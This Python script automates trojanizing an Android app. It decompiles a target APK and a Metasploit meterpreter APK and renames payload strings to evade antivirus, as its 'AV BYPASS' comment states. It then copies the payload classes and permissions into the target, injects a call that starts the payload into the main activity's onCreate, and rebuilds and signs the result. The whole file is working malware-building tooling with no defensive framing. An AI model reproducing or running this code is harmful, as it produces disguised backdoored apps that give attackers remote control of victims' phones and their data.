#!/usr/bin/python

import sys , argparse, os, shutil, fileinput, errno
import xml.etree.ElementTree as ET
from subprocess import call
from distutils.dir_util import copy_tree


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def mkdir_p(path):
    try:
        os.makedirs(path)
    except OSError as exc:  # Python >2.5
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else:
            raise


parser = argparse.ArgumentParser()
parser.add_argument("target", help="The target APK for reverse engineering")
parser.add_argument("meterpreter", help="The meterpreter payload agent.apk")
parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
args = parser.parse_args()

if args.verbose:
	print "Verbose mode on"

#VALIDATION PHASE

metasploitWord = "indictment"
payloadWord = "thisIsntTheStringYouAreLookingFor"
ROOT='/home/danielftapiar/APK/tests'
xmlParser="parseXML.py"
#injectCode="invoke-static {p0}, Lcom\/"+metasploitWord+"\/stage\/Payload;->start(Landroid\/content\/Context;)V"
injectCode="\t\tinvoke-static {p0}, Lcom/"+metasploitWord+"/stage/Payload;->start(Landroid/content/Context;)V \n"

fileTarget = os.path.join(os.getcwd(), args.target)
fileMeterpreter = os.path.join(os.getcwd(), args.meterpreter)

filenameTarget, file_extension_target = os.path.splitext(fileTarget)
filenameMeterpreter, file_extension_meterpreter = os.path.splitext(fileMeterpreter)


if(os.path.isdir(fileTarget)):
	print bcolors.FAIL + "*ERROR* " +bcolors.ENDC +" target: path is a directory"
	exit(1)
else:
	if(file_extension_target != ".apk"):
		print bcolors.FAIL + "*ERROR* " +bcolors.ENDC +" Target: "+bcolors.WARNING+" < " +args.target +" >  "+bcolors.ENDC+"Not and apk"
		exit(2)
	elif(args.verbose):
		print "valid apk"
	if(not os.path.exists(fileTarget)):
		print bcolors.FAIL + "*ERROR* " +bcolors.ENDC +" Target APK not found: "+ bcolors.WARNING +fileTarget + bcolors.ENDC
		exit(3)

if(os.path.isdir(fileMeterpreter)):
	print bcolors.FAIL + "*ERROR* " +bcolors.ENDC +" meterpreter: path is a directory"
	exit(1)
else:
	if(file_extension_meterpreter != ".apk"):
		print bcolors.FAIL + "*ERROR* " +bcolors.ENDC +" Meterpreter: <" +args.meterpreter+"> Not and apk"
		exit(2)
	elif(args.verbose):
		print "valid apk"
	if( not os.path.exists(fileMeterpreter)):
		print bcolors.FAIL + "*ERROR* " +bcolors.ENDC +" Meterpreter APK not found: "+ bcolors.WARNING +fileMeterpreter + bcolors.ENDC
		exit(3)


print bcolors.OKGREEN+"Validation Successfull" + bcolors.ENDC

# MKDIR1 PHASE 
decompiledDir, ext = os.path.splitext(os.path.basename(fileTarget)) 


currentdir = os.getcwd()
decompiledDirAbs = os.path.join(os.getcwd(), decompiledDir)

if os.path.exists(decompiledDirAbs):
    shutil.rmtree(decompiledDirAbs)
os.makedirs(decompiledDirAbs, 0755)
print bcolors.OKGREEN+"Directory creation Successfull" + bcolors.ENDC

if(args.verbose):
	print "----"
	print "Decompiled dir: "+ decompiledDir
	print "Decompiled dirAbs: "+ decompiledDirAbs
	print "filenameTarget: "+ filenameTarget
	print "fileTarget: "+ fileTarget
	print "----"

#DECOMPILE PHASE

call(["apktool", "d", fileTarget, "-o" ,decompiledDirAbs+"/apktool"])
print bcolors.OKGREEN+"Target APK Decompiled" + bcolors.ENDC
call(["apktool", "d", fileMeterpreter, "-o" ,decompiledDirAbs+"/meterpreter"])
print bcolors.OKGREEN+"Meterpreter APK Decompiled" + bcolors.ENDC

stagePath = decompiledDirAbs+"/meterpreter/smali/com/metasploit/stage"
payloadDirInTargetAbs = decompiledDirAbs+"/apktool/smali/com/"+metasploitWord+"/stage"

if(args.verbose):
	print "----"
	print "payloadDirInTargetAbs: "+payloadDirInTargetAbs
	print "----"

smaliFiles = os.listdir(stagePath)
# SEARCH AND REPLACE PHASE (AV BYPASS)
for count, f in enumerate(smaliFiles):
	filedata = None
	with open( os.path.join(stagePath,f), "r" ) as source:
		filedata = source.read()

	filedata = filedata.replace("metasploit", metasploitWord)
	#filedata = filedata.replace("Payload", payloadWord)
	#if f == "Payload.smali":
	#	with open( os.path.join(stagePath,payloadWord+".smali"), "w" ) as source:
	#		source.write(filedata)
	#	os.remove(os.path.join(stagePath,f))
	#else:
	with open( os.path.join(stagePath,f), "w" ) as source:
		source.write(filedata)

# MKDIR2 PHASE (COPY PAYLOAD TO TARGET APK)
mkdir_p(payloadDirInTargetAbs)
copy_tree(stagePath, payloadDirInTargetAbs)

#XML COPY PHASE

root = ET.parse(decompiledDirAbs+"/apktool/AndroidManifest.xml").getroot()
key = None
for activity in root.iter("activity"):
	for intentFilters in activity.iter("intent-filter"):
		for category in intentFilters.iter("category"):
			# attribute = category.get("android:name")
			attributes = category.items()
			for attribute in attributes:
				if attribute[1] == "android.intent.category.LAUNCHER":
					for activityItem in activity.keys():
						if(activityItem.strip() == "{http://schemas.android.com/apk/res/android}name"):
							key = activity.get(activityItem)

if not key:
	print "Main Activity Not found in "+decompiledDirAbs+"/apktool/AndroidManifest.xml"
	exit(3)
print key
dir = key.split('.')
path = ""
last = len(dir) - 1

for i, obj in enumerate(dir):
	if i == 0:
		path = obj
	elif i == last:
		path = path+"/"+obj+".smali"
	else:
		path = path+"/"+obj

print bcolors.OKGREEN+"Found Main Activity in Target AndroidManifest.xml: "+key + bcolors.ENDC

print bcolors.OKGREEN+"Copying permissions from Meterpreter.apk to target.apk"+ bcolors.ENDC

targetTree = ET.parse(decompiledDirAbs+"/apktool/AndroidManifest.xml")
meterpreterTree = ET.parse(decompiledDirAbs+"/meterpreter/AndroidManifest.xml")

rootTarget = targetTree.getroot()
rootMeterpreter = meterpreterTree.getroot()

# root.iter("uses-permission")


for permissionMeterpreter in rootMeterpreter.iter("uses-permission"):
	androidNameKey = permissionMeterpreter.keys()[0]
	found = False
	for permissionTarget in rootTarget.iter("uses-permission"):
		if permissionTarget.get(androidNameKey) == permissionMeterpreter.get(androidNameKey):
			found = True
	if not found : 
		rootTarget.append(permissionMeterpreter)

targetTree.write(decompiledDirAbs+"/apktool/AndroidManifest.xml")


print bcolors.OKGREEN+"Copying permissions Success: "+ bcolors.ENDC

mainActivitySmaliAbs = decompiledDirAbs+"/apktool/smali/"+path


filedata = None
outputFileData = ""
with open( mainActivitySmaliAbs, "r" ) as source:
	filedata = source.read().splitlines()
	for line in filedata:
		line += "\n"
		outputFileData += line
		if "->onCreate(Landroid/os/Bundle;)V" in line:
			outputFileData += "\n"
			outputFileData += injectCode

with open( mainActivitySmaliAbs, "w" ) as source:
	source.write(outputFileData)

#recompile APK

mkdir_p(decompiledDirAbs+"/recompiled")
call(["apktool", "b", decompiledDirAbs+"/apktool", "-o" ,decompiledDirAbs+"/recompiled/payload.apk"])

# Sign APK
call(["java", "-jar", "/home/danielftapiar/Github/uber-apk-signer/target/uber-apk-signer.jar", "--apks", decompiledDirAbs+"/recompiled/payload.apk", "-o",decompiledDirAbs+"/recompiled/payloadSigned.apk" ])





# try:
# 	key
# except NameError:
# 	print "-1"
# else:
# 	dir = key.split('.')
# 	path = ""
# 	last = len(dir) - 1

# 	for i, obj in enumerate(dir):
# 		if i == 0:
# 			path = obj
# 		elif i == last:
# 			path = path+"/"+obj+".smali"
# 		else:
# 			path = path+"/"+obj

# 	exit(path)


